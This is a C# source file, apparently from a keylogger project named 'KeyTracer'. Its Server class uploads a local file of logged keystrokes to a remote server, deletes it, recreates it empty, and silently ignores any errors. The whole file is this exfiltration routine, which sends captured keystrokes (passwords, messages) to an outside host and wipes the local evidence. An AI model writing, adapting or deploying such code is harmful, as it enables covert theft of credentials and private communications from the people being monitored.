using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace KeyTracer
{
    static class Server
    {
        public static int Upload()
        {
            try
            {
                Consts.isUploading = true;

                WebClient webClient = new WebClient();

                webClient.UploadFile(Consts.Server + Consts.serverKeyTraces, Consts.keytracePath);

                File.Delete(Consts.keytracePath);
                if (!File.Exists(Consts.keytracePath))
                {
                    using (StreamWriter sw = new StreamWriter(Consts.keytracePath))
                    {
                        sw.Close();
                    }
                }

                Consts.isUploading = false;

                return 1;
            }
            catch
            {
                return 0;
            }
        }
    }
}
